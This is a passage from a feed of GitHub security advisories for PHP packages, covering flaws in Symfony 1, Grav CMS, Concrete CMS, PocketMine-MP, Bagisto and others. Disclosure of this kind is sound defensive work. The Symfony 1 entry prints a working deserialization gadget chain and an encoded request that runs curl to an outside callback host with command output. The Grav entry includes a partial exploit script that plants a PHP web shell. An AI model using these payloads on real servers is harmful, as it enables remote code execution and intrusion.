{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for PHP packages hosted at packagist.org",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Acomposer",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/composer.json",
    "description": "Security Advisory for PHP packages hosted at packagist.org on GitHub",
    "items": [
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Vulnerability in <strong>SecureProps</strong> involves a regex failing to detect tags during decryption of encrypted data. </p>\n<p>This occurs when the encrypted data has been encoded with <code>NullEncoder</code> and passed to <code>TagAwareCipher</code>, and contains special characters such as <code>\\n</code>. As a result, the decryption process is skipped since the tags are not detected. This causes the encrypted data to be returned in plain format. </p>\n<p>The vulnerability affects users who implement <code>TagAwareCipher</code> with any base cipher that has <code>NullEncoder</code> (not default).</p>\n<h3 id=\"patches\">Patches</h3>\n<p>The patch for the issue has been released. Users are advised to update to version <strong>1.2.2</strong>.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p><strong>The main recommendation is to update to the latest version as there are no breaking changes.</strong></p>\n<p>If that's not possible, you can use the default <code>Base64Encoder</code> with the base cipher decorated with <code>TagAwareCipher</code> to prevent special characters in the encrypted string from interfering with regex tag detection logic. </p>\n<p>This workaround is safe but may involve double encoding since <code>TagAwareCipher</code> uses <code>Base64Encoder</code> by default.</p>\n<h3 id=\"references\">References</h3>\n<p>Reported issue: <a href=\"https://github.com/IlicMiljan/Secure-Props/issues/20\">https://github.com/IlicMiljan/Secure-Props/issues/20</a>\nPull request resolving bug: <a href=\"https://github.com/IlicMiljan/Secure-Props/pull/21\">https://github.com/IlicMiljan/Secure-Props/pull/21</a></p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/IlicMiljan/Secure-Props/security/advisories/GHSA-rj29-j2g4-77q8\">https://github.com/IlicMiljan/Secure-Props/security/advisories/GHSA-rj29-j2g4-77q8</a></li>\n<li><a href=\"https://github.com/IlicMiljan/Secure-Props/issues/20\">https://github.com/IlicMiljan/Secure-Props/issues/20</a></li>\n<li><a href=\"https://github.com/IlicMiljan/Secure-Props/pull/21\">https://github.com/IlicMiljan/Secure-Props/pull/21</a></li>\n<li><a href=\"https://github.com/IlicMiljan/Secure-Props/commit/ab7b561040cd37fda3dbf9a6cab01fefcaa16627\">https://github.com/IlicMiljan/Secure-Props/commit/ab7b561040cd37fda3dbf9a6cab01fefcaa16627</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-28864\">https://nvd.nist.gov/vuln/detail/CVE-2024-28864</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-rj29-j2g4-77q8\">https://github.com/advisories/GHSA-rj29-j2g4-77q8</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-rj29-j2g4-77q8",
            "title": "[ilicmiljan/secure-props] [TagAwareCipher] - Decryption Failure (Regex Match)",
            "date_modified": "2024-03-19T18:30:48.000Z",
            "date_published": "2024-03-18T20:39:00.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-rj29-j2g4-77q8"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Symfony 1 has a gadget chain due to vulnerable Swift Mailer dependency that would enable an attacker to get remote code execution if a developer unserialize user input in his project.</p>\n<h3 id=\"details\">Details</h3>\n<p>This vulnerability present no direct threat but is a vector that will enable remote code execution if a developper deserialize user untrusted data. For example:</p>\n<pre><code class=\"language-php\"> public function executeIndex(sfWebRequest $request)\n  {\n    $a = unserialize($request-&gt;getParameter('user'));\n  }\n</code></pre>\n<p>We will make the assumption this is the case in the rest of this explanation.</p>\n<p>Symfony 1 depends on Swift Mailer which is bundled by default in <code>vendor</code> directory in the default installation since 1.3.0. Swift Mailer classes implement some <code>__destruct()</code> methods like for instance <code>Swift_KeyCache_DiskKeyCache</code> :</p>\n<pre><code class=\"language-php\">  public function __destruct()\n  {\n    foreach ($this-&gt;_keys as $nsKey=&gt;$null)\n    {\n      $this-&gt;clearAll($nsKey);\n    }\n  }\n</code></pre>\n<p>This method is called when php destroy the object in memory. However, it is possible to include any object type in <code>$this-&gt;_keys</code> to make PHP access to another array/object properties than intended by the developer. In particular, it is possible to abuse the array access which is triggered on <code>foreach($this-&gt;_keys ...)</code> for any class implementing <code>ArrayAccess</code>  interface. <code>sfOutputEscaperArrayDecorator</code>  implements such interface. Here is the call made on <code>offsetGet()</code>:</p>\n<pre><code class=\"language-php\">  public function offsetGet($offset)\n  {\n    return sfOutputEscaper::escape($this-&gt;escapingMethod, $this-&gt;value[$offset]);\n  }\n</code></pre>\n<p>Which trigger <code>escape()</code> in <code>sfOutputEscaper</code> class with attacker controlled parameters from deserialized object with <code>$this-&gt;escapingMethod</code> and <code>$this-&gt;value[$offset]</code>:</p>\n<pre><code class=\"language-php\">  public static function escape($escapingMethod, $value)\n  {\n    if (null === $value)\n    {\n      return $value;\n    }\n\n    // Scalars are anything other than arrays, objects and resources.\n    if (is_scalar($value))\n    {\n      return call_user_func($escapingMethod, $value);\n    }\n</code></pre>\n<p>Which calls <code>call_user_func</code> with previous attacker controlled input.</p>\n<p>However, most recent versions of Swift Mailer are not vulnerable anymore. A fix has been done with <a href=\"https://github.com/swiftmailer/swiftmailer/commit/5878b18b36c2c119ef0e8cd49c3d73ee94ca0fed\">commit 5878b18b36c2c119ef0e8cd49c3d73ee94ca0fed</a> to prevent #arbitrary deserialization. This commit has been shipped with version 6.2.5 of Swift Mailer.</p>\n<p>Concreetly, <code>__wakeup()</code> have been implemented to clear attributes' values:</p>\n<pre><code class=\"language-php\">  public function __wakeup()\n  {\n      $this-&gt;keys = [];\n  }\n</code></pre>\n<p>And/or prevent any deserialization:</p>\n<pre><code class=\"language-php\">  public function __wakeup()\n  {\n      throw new \\BadMethodCallException('Cannot unserialize '.__CLASS__);\n  }\n</code></pre>\n<p>If you install last version 1.5 with composer, you will end-up installing last 6.x version of Swift Mailer containing the previous fixes. Here is an extract of the composer.lock:</p>\n<pre><code class=\"language-json\">{\n  \"name\": \"friendsofsymfony1/symfony1\",\n  \"version\": \"v1.5.15\",\n  \"source\": {\n      \"type\": \"git\",\n      \"url\": \"https://github.com/FriendsOfSymfony1/symfony1.git\",\n      \"reference\": \"9945f3f27cdc5aac36f5e8c60485e5c9d5df86f2\"\n  },\n  \"require\": {\n      \"php\": \"&gt;=5.3.0\",\n      \"swiftmailer/swiftmailer\": \"~5.2 || ^6.0\"\n  },\n  ...\n  {\n    \"name\": \"swiftmailer/swiftmailer\",\n    \"version\": \"v6.3.0\",\n  ...\n  }\n}\n</code></pre>\n<p>By reviewing releases archives, <code>composer.json</code> targets vulnerable branch 5.x before Symfony 1.5.13 included:</p>\n<pre><code class=\"language-json\">{\n    \"name\": \"friendsofsymfony1/symfony1\",\n    \"description\": \"Fork of symfony 1.4 with dic, form enhancements, latest swiftmailer and better performance\",\n    \"type\": \"library\",\n    \"license\": \"MIT\",\n    \"require\": {\n        \"php\" : \"&gt;=5.3.0\",\n        \"swiftmailer/swiftmailer\": \"~5.2\"\n    },\n    ...\n</code></pre>\n<p>So, the gadget chain is valid for at least versions until 1.5.13.</p>\n<p>However, if you install last version of Symfony with git as described in the README, Swift Mailer vendors is referenced through a git sub-module targeting branch 5.x of Swift Mailer:</p>\n<pre><code class=\"language-shell\">[submodule \"lib/vendor/swiftmailer\"]\n    path = lib/vendor/swiftmailer\n    url = https://github.com/swiftmailer/swiftmailer.git\n    branch = 5.x\n[submodule \"lib/plugins/sfDoctrinePlugin/lib/vendor/doctrine\"]\n    path = lib/plugins/sfDoctrinePlugin/lib/vendor/doctrine\n    url = https://github.com/FriendsOfSymfony1/doctrine1.git\n</code></pre>\n<p>And branch 5.x does not have the backport of the fix commited on branch 6.x. Last commit date from Jul 31, 2018.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>So we need the following object to trigger an OS command like <code>shell_exec(\"curl https://h0iphk4mv3e55nt61wjp9kur9if930vok.oastify.com?a=$(id)\");</code>:</p>\n<pre><code class=\"language-php\">object(Swift_KeyCache_DiskKeyCache)#88 (4) {\n  [\"_stream\":\"Swift_KeyCache_DiskKeyCache\":private]=&gt;\n  NULL\n  [\"_path\":\"Swift_KeyCache_DiskKeyCache\":private]=&gt;\n  string(25) \"thispathshouldneverexists\"\n  [\"_keys\":\"Swift_KeyCache_DiskKeyCache\":private]=&gt;\n  object(sfOutputEscaperArrayDecorator)#89 (3) {\n    [\"count\":\"sfOutputEscaperArrayDecorator\":private]=&gt;\n    NULL\n    [\"value\":protected]=&gt;\n    array(1) {\n      [1]=&gt;\n      string(66) \"curl https://h0iphk4mv3e55nt61wjp9kur9if930vok.oastify.com?a=$(id)\"\n    }\n    [\"escapingMethod\":protected]=&gt;\n    string(10) \"shell_exec\"\n  }\n  [\"_quotes\":\"Swift_KeyCache_DiskKeyCache\":private]=&gt;\n  bool(false)\n}\n</code></pre>\n<p>We craft a chain with PHPGGC. Please do not publish it as I will make a PR on PHPGGC but I wait for you to fix before:</p>\n<ul>\n<li>gadgets.php:</li>\n</ul>\n<pre><code class=\"language-php\">class Swift_KeyCache_DiskKeyCache\n{\n  private $_path;\n  private $_keys = array();\n  public function __construct($keys, $path) {\n    $this-&gt;_keys = $keys;\n    $this-&gt;_path = $path;\n  }\n}\n\nclass sfOutputEscaperArrayDecorator\n{\n  protected $value;\n  protected $escapingMethod;\n  public function __construct($escapingMethod, $value) {\n    $this-&gt;escapingMethod = $escapingMethod;\n    $this-&gt;value = $value;\n  }\n}\n</code></pre>\n<ul>\n<li>chain.php:</li>\n</ul>\n<pre><code class=\"language-php\">namespace GadgetChain\\Symfony;\n\nclass RCE12 extends \\PHPGGC\\GadgetChain\\RCE\\FunctionCall\n{\n    public static $version = '1.3.0 &lt; 1.5.15';\n    public static $vector = '__destruct';\n    public static $author = 'darkpills';\n    public static $information = \n        'Based on Symfony 1 and Swift mailer in Symfony\\'s vendor';\n\n    public function generate(array $parameters)\n    {\n        $cacheKey = \"1\";\n        $keys = new \\sfOutputEscaperArrayDecorator($parameters['function'], array($cacheKey =&gt; $parameters['parameter']));\n        $path = \"thispathshouldneverexists\";\n        $cache = new \\Swift_KeyCache_DiskKeyCache($keys, $path);\n\n        return $cache;\n    }\n}\n</code></pre>\n<p>And trigger the deserialization with an HTTP request like the following on a dummy test controller:</p>\n<pre><code class=\"language-http\">POST /frontend_dev.php/test/index HTTP/1.1\nHost: localhost:8001\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nConnection: close\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 532\n\nuser=a%3A2%3A%7Bi%3A7%3BO%3A27%3A%22Swift_KeyCache_DiskKeyCache%22%3A2%3A%7Bs%3A34%3A%22%00Swift_KeyCache_DiskKeyCache%00_path%22%3Bs%3A25%3A%22thispathshouldneverexists%22%3Bs%3A34%3A%22%00Swift_KeyCache_DiskKeyCache%00_keys%22%3BO%3A29%3A%22sfOutputEscaperArrayDecorator%22%3A2%3A%7Bs%3A8%3A%22%00%2A%00value%22%3Ba%3A1%3A%7Bi%3A1%3Bs%3A66%3A%22curl+https%3A%2F%2Fh0iphk4mv3e55nt61wjp9kur9if930vok.oastify.com%3Fa%3D%24%28id%29%22%3B%7Ds%3A17%3A%22%00%2A%00escapingMethod%22%3Bs%3A10%3A%22shell_exec%22%3B%7D%7Di%3A7%3Bi%3A7%3B%7D\n</code></pre>\n<p>Note that CVSS score is not applicable to this kind of vulnerability.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>The attacker can execute any PHP command which leads to remote code execution.</p>\n<h3 id=\"recommendation\">Recommendation</h3>\n<p>As with composer, Symfony is already using branch 6.x of Swift mailer there does not seem to be breaking change for Symfony 1 with branch 6.x? Or is it a mistake?</p>\n<p>In this case, update submodule reference to version 6.2.5 or higher, after commit 5878b18b36c2c119ef0e8cd49c3d73ee94ca0fed</p>\n<p>Or if Symfony 1.5 need Swift 5.x, fork Swift mailer in a FOS/SwiftMailer repository and cherry-pick commit 5878b18b36c2c119ef0e8cd49c3d73ee94ca0fed</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/FriendsOfSymfony1/symfony1/security/advisories/GHSA-wjv8-pxr6-5f4r\">https://github.com/FriendsOfSymfony1/symfony1/security/advisories/GHSA-wjv8-pxr6-5f4r</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-28859\">https://nvd.nist.gov/vuln/detail/CVE-2024-28859</a></li>\n<li><a href=\"https://github.com/FriendsOfSymfony1/symfony1/commit/edb850f94fb4de18ca53d0d1824910d6e8130166\">https://github.com/FriendsOfSymfony1/symfony1/commit/edb850f94fb4de18ca53d0d1824910d6e8130166</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-wjv8-pxr6-5f4r\">https://github.com/advisories/GHSA-wjv8-pxr6-5f4r</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-wjv8-pxr6-5f4r",
            "title": "[friendsofsymfony1/symfony1] Gadget chain in Symfony 1 due to vulnerable Swift Mailer dependency",
            "date_modified": "2024-03-18T20:36:06.000Z",
            "date_published": "2024-03-18T20:36:06.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-wjv8-pxr6-5f4r"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Insecure Direct Object Reference (IDOR) in Bagisto v.1.5.0 allows an attacker to obtain sensitive information via the invoice ID parameter.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-36238\">https://nvd.nist.gov/vuln/detail/CVE-2023-36238</a></li>\n<li><a href=\"https://github.com/Ek-Saini/security/blob/main/IDOR-Bagisto\">https://github.com/Ek-Saini/security/blob/main/IDOR-Bagisto</a></li>\n<li><a href=\"https://github.com/bagisto/bagisto/pull/4697\">https://github.com/bagisto/bagisto/pull/4697</a></li>\n<li><a href=\"https://github.com/bagisto/bagisto/commit/2a24098cb582e072c87177e0ad17be45f240ad17\">https://github.com/bagisto/bagisto/commit/2a24098cb582e072c87177e0ad17be45f240ad17</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-pmc7-hmmw-g96q\">https://github.com/advisories/GHSA-pmc7-hmmw-g96q</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-pmc7-hmmw-g96q",
            "title": "[bagisto/bagisto] Bagisto vulnerable to Insecure Direct Object Reference (IDOR)",
            "date_modified": "2024-03-15T21:03:01.000Z",
            "date_published": "2024-03-13T21:31:02.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-pmc7-hmmw-g96q"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>livehelperchat 4.28v is vulnerable to Server-Side Template Injection (SSTI).</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-27516\">https://nvd.nist.gov/vuln/detail/CVE-2024-27516</a></li>\n<li><a href=\"https://github.com/LiveHelperChat/livehelperchat/issues/2054\">https://github.com/LiveHelperChat/livehelperchat/issues/2054</a></li>\n<li><a href=\"https://github.com/LiveHelperChat/livehelperchat/commit/a61d231526a36d4a7d8cc957914799ee1f9db0ab\">https://github.com/LiveHelperChat/livehelperchat/commit/a61d231526a36d4a7d8cc957914799ee1f9db0ab</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-v4cp-2q7v-hg9q\">https://github.com/advisories/GHSA-v4cp-2q7v-hg9q</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-v4cp-2q7v-hg9q",
            "title": "[remdex/livehelperchat] livehelperchat Server-Side Template Injection",
            "date_modified": "2024-03-10T05:01:00.000Z",
            "date_published": "2024-02-29T03:33:18.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-v4cp-2q7v-hg9q"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Concrete CMS before 8.5.14 and 9 before 9.2.3 is vulnerable to an admin adding a stored XSS payload via the Layout Preset name.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-48650\">https://nvd.nist.gov/vuln/detail/CVE-2023-48650</a></li>\n<li><a href=\"https://documentation.concretecms.org/developers/introduction/version-history/923-release-notes\">https://documentation.concretecms.org/developers/introduction/version-history/923-release-notes</a></li>\n<li><a href=\"https://www.concretecms.org/about/project-news/security/2023-12-05-concrete-cms-new-cves-and-cve-updates\">https://www.concretecms.org/about/project-news/security/2023-12-05-concrete-cms-new-cves-and-cve-updates</a></li>\n<li><a href=\"https://github.com/concretecms/concretecms/commit/077755e6bbbc1c67b7508add9e3d207e8d8909a0\">https://github.com/concretecms/concretecms/commit/077755e6bbbc1c67b7508add9e3d207e8d8909a0</a></li>\n<li><a href=\"https://github.com/concretecms/concretecms/commit/5b93470bcccf271810d3a0b190368ce6a9d6c84b\">https://github.com/concretecms/concretecms/commit/5b93470bcccf271810d3a0b190368ce6a9d6c84b</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-x577-gcc9-9xjj\">https://github.com/advisories/GHSA-x577-gcc9-9xjj</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-x577-gcc9-9xjj",
            "title": "[concrete5/concrete5] Concrete CMS Stored XSS in Layout Preset Name",
            "date_modified": "2024-03-10T05:00:59.000Z",
            "date_published": "2024-02-29T03:33:14.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-x577-gcc9-9xjj"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Concrete CMS before 8.5.14 and 9 before 9.2.3 is vulnerable to an admin adding a stored XSS payload via the Layout Preset name.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-48650\">https://nvd.nist.gov/vuln/detail/CVE-2023-48650</a></li>\n<li><a href=\"https://documentation.concretecms.org/developers/introduction/version-history/923-release-notes\">https://documentation.concretecms.org/developers/introduction/version-history/923-release-notes</a></li>\n<li><a href=\"https://www.concretecms.org/about/project-news/security/2023-12-05-concrete-cms-new-cves-and-cve-updates\">https://www.concretecms.org/about/project-news/security/2023-12-05-concrete-cms-new-cves-and-cve-updates</a></li>\n<li><a href=\"https://github.com/concretecms/concretecms/commit/077755e6bbbc1c67b7508add9e3d207e8d8909a0\">https://github.com/concretecms/concretecms/commit/077755e6bbbc1c67b7508add9e3d207e8d8909a0</a></li>\n<li><a href=\"https://github.com/concretecms/concretecms/commit/5b93470bcccf271810d3a0b190368ce6a9d6c84b\">https://github.com/concretecms/concretecms/commit/5b93470bcccf271810d3a0b190368ce6a9d6c84b</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-x577-gcc9-9xjj\">https://github.com/advisories/GHSA-x577-gcc9-9xjj</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-x577-gcc9-9xjj",
            "title": "[concrete5/concrete5] Concrete CMS Stored XSS in Layout Preset Name",
            "date_modified": "2024-03-10T05:00:59.000Z",
            "date_published": "2024-02-29T03:33:14.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-x577-gcc9-9xjj"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Concrete CMS version 9 before 9.2.7 is vulnerable to Stored XSS via the Name field of a Group type since there is insufficient validation of administrator provided data for that field. A rogue administrator could inject malicious code into the Name field which might be executed when users visit the affected page. The Concrete CMS security team gave this vulnerability a CVSS v3.1 score of 2.2 with a vector of AV:N/AC:H/PR:H/UI:N/S:U/C:L/I:N/A:N  Concrete versions below 9 do not include group types so they are not affected by this vulnerability. Thanks Luca Fuda for reporting.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-2179\">https://nvd.nist.gov/vuln/detail/CVE-2024-2179</a></li>\n<li><a href=\"https://documentation.concretecms.org/9-x/developers/introduction/version-history/927-release-notes\">https://documentation.concretecms.org/9-x/developers/introduction/version-history/927-release-notes</a></li>\n<li><a href=\"https://github.com/concretecms/concretecms/commit/ac1ec9b069acac79869b2988e1f56cc5565a3dd4\">https://github.com/concretecms/concretecms/commit/ac1ec9b069acac79869b2988e1f56cc5565a3dd4</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-4m7h-34xm-4wjv\">https://github.com/advisories/GHSA-4m7h-34xm-4wjv</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-4m7h-34xm-4wjv",
            "title": "[concrete5/concrete5] Concrete CMS Stored Cross-site Scripting vulnerability",
            "date_modified": "2024-03-06T17:05:06.000Z",
            "date_published": "2024-03-05T21:30:25.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-4m7h-34xm-4wjv"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>An attacker could crash the server by sending malformed JWT JSON in LoginPacket due to a security vulnerability in <a href=\"https://github.com/cweiske/JsonMapper\">netresearch/jsonmapper</a>, due to attempting to construct objects from scalar types by default without any validation, with unexpected results that caused PocketMine-MP to crash.</p>\n<p>Due to the relatively high number of security issues arising from this specific dependency, the team is exploring options to replace it.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>In the meantime, the issue was fixed by pmmp/netresearch-jsonmapper@b96a209f9e8b76b899a0d0918493cd87eb3c02a7 and 6872661fd03649cc7a8762c41c16e9ee5a4de1c9.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Detecting the malicious data that triggers this issue is of rather high difficulty, so it's not likely that a plugin would be able to easily remediate this.</p>\n<h3 id=\"references\">References</h3>\n<p><a href=\"https://github.com/cweiske/jsonmapper/issues/226\">https://github.com/cweiske/jsonmapper/issues/226</a></p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/pmmp/PocketMine-MP/security/advisories/GHSA-h6j3-j35f-v2x7\">https://github.com/pmmp/PocketMine-MP/security/advisories/GHSA-h6j3-j35f-v2x7</a></li>\n<li><a href=\"https://github.com/cweiske/jsonmapper/issues/226\">https://github.com/cweiske/jsonmapper/issues/226</a></li>\n<li><a href=\"https://github.com/pmmp/PocketMine-MP/commit/6872661fd03649cc7a8762c41c16e9ee5a4de1c9\">https://github.com/pmmp/PocketMine-MP/commit/6872661fd03649cc7a8762c41c16e9ee5a4de1c9</a></li>\n<li><a href=\"https://github.com/pmmp/netresearch-jsonmapper/commit/b96a209f9e8b76b899a0d0918493cd87eb3c02a7\">https://github.com/pmmp/netresearch-jsonmapper/commit/b96a209f9e8b76b899a0d0918493cd87eb3c02a7</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-h6j3-j35f-v2x7\">https://github.com/advisories/GHSA-h6j3-j35f-v2x7</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-h6j3-j35f-v2x7",
            "title": "[pocketmine/pocketmine-mp] PocketMine-MP server crash with certain invalid JSON payloads in `LoginPacket` due to dependency vulnerability (3rd time)",
            "date_modified": "2024-03-06T17:02:08.000Z",
            "date_published": "2024-03-06T17:02:06.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-h6j3-j35f-v2x7"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>If a client sends a BookEditPacket with InventorySlot greater than 35, the server will crash due to an unhandled exception thrown by <code>BaseInventory-&gt;getItem()</code>.</p>\n<h3 id=\"details\">Details</h3>\n<p>Crashes at <a href=\"https://github.com/pmmp/PocketMine-MP/blob/b744e09352a714d89220719ab6948a010ac636fc/src/network/mcpe/handler/InGamePacketHandler.php#L873\">https://github.com/pmmp/PocketMine-MP/blob/b744e09352a714d89220719ab6948a010ac636fc/src/network/mcpe/handler/InGamePacketHandler.php#L873</a></p>\n<h3 id=\"poc\">PoC</h3>\n<p>Using Gophertunnel, use <code>serverConn.WritePacket(&amp;packet.BookEdit{InventorySlot: 36})</code></p>\n<h3 id=\"impact\">Impact</h3>\n<p>Server crash, all servers</p>\n<h3 id=\"patched-versions\">Patched versions</h3>\n<p>This issue was fixed by 47f011966092f275cc1b11f8de635e89fd9651a7, and the fix was released in 5.11.2.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/pmmp/PocketMine-MP/security/advisories/GHSA-xc7j-wj36-qjfr\">https://github.com/pmmp/PocketMine-MP/security/advisories/GHSA-xc7j-wj36-qjfr</a></li>\n<li><a href=\"https://github.com/pmmp/PocketMine-MP/commit/47f011966092f275cc1b11f8de635e89fd9651a7\">https://github.com/pmmp/PocketMine-MP/commit/47f011966092f275cc1b11f8de635e89fd9651a7</a></li>\n<li><a href=\"https://github.com/pmmp/PocketMine-MP/blob/b744e09352a714d89220719ab6948a010ac636fc/src/network/mcpe/handler/InGamePacketHandler.php#L873\">https://github.com/pmmp/PocketMine-MP/blob/b744e09352a714d89220719ab6948a010ac636fc/src/network/mcpe/handler/InGamePacketHandler.php#L873</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-xc7j-wj36-qjfr\">https://github.com/advisories/GHSA-xc7j-wj36-qjfr</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-xc7j-wj36-qjfr",
            "title": "[pocketmine/pocketmine-mp] PocketMine-MP BookEditPacket crash when inventory slot in the packet is invalid",
            "date_modified": "2024-03-06T17:01:27.000Z",
            "date_published": "2024-03-06T17:01:27.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-xc7j-wj36-qjfr"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<ul>\n<li>Due to insufficient permission verification, user who can write a page use frontmatter feature.</li>\n<li>Inadequate File Name Validation</li>\n</ul>\n<h3 id=\"details\">Details</h3>\n<ol>\n<li>Insufficient Permission Verification</li>\n</ol>\n<p>In Grav CMS, \"<a href=\"https://learn.getgrav.org/17/content/headers\">Frontmatter</a>\" refers to the metadata block located at the top of a Markdown file. Frontmatter serves the purpose of providing additional information about a specific page or post.\nIn this feature, only administrators are granted access, while regular users who can create pages are not. However, if a regular user adds the data[_json][header][form] parameter to the POST Body while creating a page, they can use Frontmatter. The demonstration of this vulnerability is provided in video format. <a href=\"https://www.youtube.com/watch?v=EU1QA0idoWE\">Video Link</a></p>\n<ol start=\"2\">\n<li>Inadequate File Name Validation</li>\n</ol>\n<p>To create a Contact Form, Frontmatter and markdown can be written as follows:\n<a href=\"https://learn.getgrav.org/17/forms/forms/example-form\">Contact Form Example</a>\n<a href=\"https://learn.getgrav.org/17/forms/forms/reference-form-actions#save\">Form Action Save Option</a>\nWhen an external user submits the Contact Form after filling it out, the data is stored in the user/data folder. The filename under which the data is stored corresponds to the value specified in the filename attribute of the process property. For instance, if the filename attribute has a value of \"feedback.txt,\" a feedback.txt file is created in the user/data/contact folder. This file contains the value entered by the user in the \"name\" field. The problem with this functionality is the lack of validation for the filename attribute, potentially allowing the creation of files such as phar files on the server. An attacker could input arbitrary PHP code into the \"name\" field to be saved on the server. However, Grav filter the &lt; and &gt; characters, so to disable these options, an xss_check: false attribute should be added. <a href=\"https://learn.getgrav.org/17/forms/forms/form-options#xss-checks\">Disable XSS</a></p>\n<pre><code>---\ntitle: Contact Form\n\nform:\n    name: contact\n    xss_check: false\n\n    fields:\n        name:\n          label: Name\n          placeholder: Enter your name\n          autocomplete: on\n          type: text\n          validate:\n            required: true\n\n    buttons:\n        submit:\n          type: submit\n          value: Submit\n\n    process:\n        save:\n            filename: this_is_file_name.phar\n            operation: add\n\n---\n\n# Contact form\n\nSome sample page content\n</code></pre>\n<p>Exploiting these two vulnerabilities allows the following scenario:</p>\n<ul>\n<li>A regular user account capable of creating pages is required.</li>\n<li>An attacker creates a Contact Form page containing malicious Frontmatter using the regular user's account.</li>\n<li>Accessing the Contact Form page, the attacker submits PHP code.</li>\n<li>The attacker attempts Remote Code Execution by accessing HOST/user/data/[form-name]/[filename].</li>\n</ul>\n<h3 id=\"poc\">PoC</h3>\n<p><a href=\"https://www.youtube.com/watch?v=Gh3ezpORbPc\">PoC Video Link</a></p>\n<pre><code class=\"language-python\"># PoC.py\nimport requests\nfrom bs4 import BeautifulSoup\n\nclass Poc:\n\n    def __init__(self, cmd):\n        self.sess = requests.Session()\n\n        ##########    INIT    ################\n        self.USERNAME = \"guest\"\n        self.PASSWORD = \"Guest123!\"\n        self.PREFIX_URL = \"http://192.168.12.119:8888/grav\"\n        self.PAGE_NAME = \"this_is_poc_page47\"\n        self.PHP_FILE_NAME = \"universe.phar\"\n        self.PAYLOAD = '&lt;?php system($_GET[\"cmd\"]); ?&gt;'\n        self.cmd = cmd\n        ##########    END    ################\n\n        self.sess.get(self.PREFIX_URL)\n        self._login()\n        self._save_page()\n        self._inject_command()\n        self._execute_command()\n    \n\n    def _get_nonce(self, data, name):\n        # Get login nonce value\n        res = BeautifulSoup(data, \"html.parser\")\n        return res.find(\"input\", {\"name\" : name}).get(\"value\")\n\n    \n    def _login(self):\n        print(\"[*] Try to Login\")\n        res = self.sess.get(self.PREFIX_URL + \"/admin\")\n\n        login_nonce = self._get_nonce(res.text, \"login-nonce\")\n\n        # Login\n        login_data = {\n            \"data[username]\" : self.USERNAME,\n            \"data[password]\" : 